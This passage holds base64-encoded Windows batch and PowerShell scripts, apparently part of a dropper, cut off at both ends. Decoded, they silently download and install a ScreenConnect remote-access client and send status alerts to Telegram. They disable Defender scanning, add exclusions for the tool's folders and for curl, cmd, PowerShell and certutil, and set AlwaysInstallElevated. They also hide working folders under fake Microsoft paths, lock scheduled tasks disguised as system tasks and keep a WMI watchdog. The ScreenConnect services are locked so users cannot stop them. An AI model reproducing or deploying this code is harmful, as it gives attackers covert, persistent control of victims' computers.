kOKVkOKVkCBoZWxwZXJzIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkAo6SW5zdGFsbE1zaQpyZW0gJTE9dXJsICUyPXRhZwpzZXQgIlVSTD0lfjEiCnNldCAiVEFH
PSV+MiIKZWNobyBbJVRBRyVdIGZldGNoICVVUkwlPj4iJUxPRyUiCiIlQ1VSTCUiIC1MIC0tc3Ns
LW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAiJU1TSSUu
dG1wIiAiJVVSTCUiID4+IiVMT0clIiAyPiYxCmZvciAlJUYgaW4gKCIlTVNJJS50bXAiKSBkbyBp
ZiAlJX56RiBMRVEgMTAwMDAwMCAoCiAgZWNobyBbJVRBRyVdIGZldGNoIGZhaWxlZD4+IiVMT0cl
IgogIGRlbCAvZiAvcSAiJU1TSSUudG1wIiA+bnVsIDI+JjEKICBleGl0IC9iIDEKKQptb3ZlIC95
ICIlTVNJJS50bXAiICIlTVNJJSIgPm51bCAyPiYxCmNhbGwgOk5vTXNpUG9saWN5CnJlbSBNMTM6
IHN0YWxlIHByaW1hcnkgZGlyIChzZXJ2aWNlIGRlbGV0ZWQsIHByb2R1Y3QgdW5yZWdpc3RlcmVk
KSBicmVha3MKcmVtIHRoZSBTQyBpbnN0YWxsZXIgY3VzdG9tIGFjdGlvbiAtIGNsZWFyIGl0IGJl
Zm9yZSBpbnN0YWxsaW5nCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
KSIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVBGODYlXFNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiAoCiAgZWNobyBzdGFsZV9wcmltYXJ5X2Rpcl9jbGVhbj4+
IiVMT0clIgogIHJtZGlyIC9zIC9xICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
X0ZQJSkiID5udWwgMj4mMQopCmVjaG8gWyVUQUclXSBtc2lleGVjIGluc3RhbGw+PiIlTE9HJSIK
bXNpZXhlYyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IC9MKnYgIiVXRCVcbXNpX2hlYWwubG9n
IiA+bnVsIDI+JjEKc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISIKZWNobyBbJVRBRyVdIG1zaWV4
ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKY2FsbCA6V2FpdFN2YwpleGl0IC9iIDAKCjpSZXBh
aXJSZWdpc3RlcmVkCnJlbSAlMT1maW5nZXJwcmludCAtIHNlcnZpY2UgZGVsZXRlZCBidXQgcHJv
ZHVjdCByZWdpc3RlcmVkOiByZXBhaXIgYnkgR1VJRC4Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3Qg
Q2xpZW50ICglfjEpIiA+bnVsIDI+JjEKaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAKaWYg
bm90IGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBleGl0IC9iIDEKcG93ZXJzaGVsbCAtTm9Qcm9m
aWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
d25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlfjEiIC1Xb3JrRGlyICIlV0QlIiA+PiIl
TE9HJSIgMj4mMQpjYWxsIDpXYWl0U3ZjCmV4aXQgL2IgMAoKOlJlc3RvcmVBbHQKcmVtIEFMVCBz
ZXJ2aWNlIGdvbmUgYnV0IHN0aWxsIHJlZ2lzdGVyZWQgKFNDLWZhbWlseSBtc2lleGVjIHNpZGUg
ZWZmZWN0KSAtIHJlcGFpciBpdCB0b28uCnNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JUFMVF9GUCUpIiA+bnVsIDI+JjEKaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDAKZWNobyBh
bHQgbWlzc2luZyAtIHJlcGFpciBhdHRlbXB0Pj4iJUxPRyUiCmlmIGV4aXN0ICIlV0QlXG93bl9s
aWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Q
b2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAg
IiVBTFRfRlAlIiAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKc2MgcXVlcnkgIlNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAppZiBub3Qg
ZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiCmV4aXQgL2IgMAoKOk5vTXNpUG9saWN5CnJlZyBk
ZWxldGUgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVy
IiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJsZU1TSSAvZiA+bnVs
IDI+JjEKcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJ
bnN0YWxsZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxCmV4
aXQgL2IgMAoKOldhaXRTdmMKc2V0ICJUUklFUz0wIgo6V2FpdExvb3AKc2MgcXVlcnkgIlNjcmVl
bkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKaWYgbm90
IGVycm9ybGV2ZWwgMSAoCiAgc2V0ICJJTlNUQUxMRUQ9MSIKICBzZXQgIlBSSU1fT0s9MSIKICBl
eGl0IC9iIDAKKQpzZXQgL2EgVFJJRVMrPTEKaWYgJVRSSUVTJSBHRVEgMTAgZXhpdCAvYiAxCnBp
bmcgMTI3LjAuMC4xIC1uIDcgPm51bCAyPiYxCmdvdG8gOldhaXRMb29wCgo6VGdTdGF0ZQpzZXQg
Ik5FV1NUQVRFPSV+MSIKc2V0ICJNU0c9JX4yIgpzZXQgIk9MRFNUQVRFPSIKaWYgZXhpc3QgIiVT
VEFURSUiIHNldCAvcCBPTERTVEFURT08IiVTVEFURSUiCnJlbSByYXRlLWxpbWl0IHJlcGVhdGVk
IERPV04vRkFJTDogbWF4IDEgYWxlcnQgcGVyIDMwIG1pbiB3aGlsZSBzdHVjawppZiAvSSAiJU5F
V1NUQVRFJSI9PSJET1dOIiBnb3RvIDpNYXliZVN1cHByZXNzCmlmIC9JICIlTkVXU1RBVEUlIj09
IkZBSUwiIGdvdG8gOk1heWJlU3VwcHJlc3MKZ290byA6U2VuZEFsZXJ0CjpNYXliZVN1cHByZXNz
CmlmIC9JICIlTkVXU1RBVEUlIj09IiVPTERTVEFURSUiIGlmIGV4aXN0ICIlV0QlXHRnX3NlbnQu
ZmxhZyIgKAogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQg
ImlmKChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVXRCVcdGdf
c2VudC5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCAzMCl7ZXhpdCAwfWVs
c2V7ZXhpdCAxfSIgPm51bCAyPiYxCiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoCiAgICBlY2hvIHRn
X3N1cHByZXNzZWRfJU5FV1NUQVRFJT4+IiVMT0clIgogICAgZXhpdCAvYiAwCiAgKQopCjpTZW5k
QWxlcnQKZWNobyAlTkVXU1RBVEUlPiIlU1RBVEUlIgplY2hvIHNlbnQ+IiVXRCVcdGdfc2VudC5m
bGFnIgpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSAlTkVXU1RBVEUlIC1T
dW1tYXJ5ICIlTVNHJSIgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQpl
Y2hvIHRnIHN0YXRlICVORVdTVEFURSUgc2VudD4+IiVMT0clIgpleGl0IC9iIDAK
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM2IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzY+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBOZXV0cmFsaXplIE1TSSBibG9jayBwb2xpY2llcyAoMTYyNSkgLS0tDQpSRU0g
RGlzYWJsZU1TSTogMD1hbGxvdywgMT1ub24tYWRtaW4gb25seSwgMj1hbGwgLT4gZm9yY2UgMA0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
QWx3YXlzSW5zdGFsbEVsZXZhdGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVn
IGRlbGV0ZSAiSEtDVVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0NVXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgQWx3YXlzSW5zdGFsbEVsZXZh
dGVkIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KDQpSRU0gLS0tIERlZmVuZGVyOiBy
ZWdpc3RyeSBleGNsdXNpb25zIChwb2xpY3kgKyBwcmVmZXJlbmNlIGtleXMpIC0tLQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlciIgL3Yg
RGlzYWJsZUFudGlTcHl3YXJlIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFk
ZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAvdCBSRUdfRFdP
UkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWlj
cm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVC
ZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRk
ICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwt
VGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlSU9BVlByb3RlY3Rpb24gL3QgUkVHX0RXT1JEIC9k
IDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29m
dFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlU2NyaXB0
U2Nhbm5pbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
V0QlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdB
UkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRDIl
IiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIkM6XFdpbmRv
d3NcVGVtcCIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIl
VEVNUCUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZU
V0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBG
JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5u
dWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAy
JSkiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FS
RVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51
bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQ
MiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMu
ZXhlIGN1cmwuZXhlIGNtZC5leGUgcG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNv
bm5lY3QuQ2xpZW50U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkg
ZG8gKA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVy
XEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
IDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2Vy
IHRoYW4gcmVnIGFsb25lKSAtLS0NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlv
blByZWZlcmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZlcmVu
Y2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURp
c2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJ
T0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5u
aW5nICR0cnVlfUNhdGNoe307IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2lu
ZG93c1xUZW1wJywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUp
JywnJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSknLCclUEY4NiVcU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQMSUpJywnJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
UDIlKScpOyIgXg0KICAidHJ5eyRwYXRocys9QChHZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJv
Z3JhbUZpbGVzIC1GaWx0ZXIgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEg
MCB8IEZvckVhY2gtT2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBm
ODY9W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7IGlmKCRw
Zjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAtRmlsdGVyICdTY3JlZW5D
b25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVs
bE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAgImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1P
YmplY3QgLVVuaXF1ZSkpeyBpZigkcCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSl7
IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVBIDAgfSB9OyIgXg0KICAiZm9y
ZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hl
bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNjaGVkdWxlZCcsJ01pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdNaWNy
b3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdNaWNyb3NvZnRcV2luZG93c1xUY3Bp
cFxJcEFkZHJlc3NDb25mbGljdDEnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBpbiAkbmFtZXMpeyAk
ZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVyaXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMu
ZXhlICRmIC9ncmFudDpyICdOVCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0
cmF0b3JzOkYnIHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uIGZp
bGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3QlXFN5c3RlbTMyXHdiZW1cUmVw
b3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0g
LS0tIEFDTDoga2VlcCBTY3JlZW5Db25uZWN0IGluc3RhbGwgZGlycyAob25jZTsgdGFrZW93biBl
dmVyeSB0aWNrIGlzIG5vaXN5KSAtLS0NCmlmIG5vdCBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmb3IgJSVEIGluICgNCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICAgICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICIlUEY4NiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICApIGRvICgNCiAgICBpZiBleGlzdCAiJSV+RCIg
Y2FsbCA6TG9ja0RpciAiJSV+RCINCiAgKQ0KICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnDQopDQoNClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3Av
ZGVsZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQ0KUkVNIFNZOiBDQyBEQyBMQyBTVyBS
UCBEVCBMTyBSQyAgKG5vIFNEIC0+IGNhbm5vdCBjaGFuZ2UgdGhpcyBTRCBpdHNlbGYpDQpzZXQg
IlNEPUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlJDOzs7U1kpKEE7O0NDRENMQ1NXUlBXUERUTE9D
UlNEUkNXRFdPOzs7QkEpIg0Kc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEN
CnNjLmV4ZSBzZHNldCAiJUFMVCUiICIlU0QlIiA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVQ
UklNJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlQUxUJSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYx
DQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYw
MDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCg0KZWNobyBzZWN1cmVf
ZG9uZT4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpMb2NrRGlyDQpzZXQgIlQ9JX4xIg0KaWYgbm90
IGV4aXN0ICIlVCUiIGV4aXQgL2IgMA0KUkVNIHRha2Ugb3duZXJzaGlwIHRoZW4gc3RyaXAgaW5o
ZXJpdGVkIEFDRXM7IFNZU1RFTStBZG1pbnMgb25seQ0KdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZ
ID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KaWNhY2xz
ICIlVCUiIC9ncmFudDpyICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvcmVtb3Zl
OmcgIlVzZXJzIiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZ
XElOVEVSQUNUSVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxDQpleGl0IC9iIDANCg==
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUMTAgLSBp
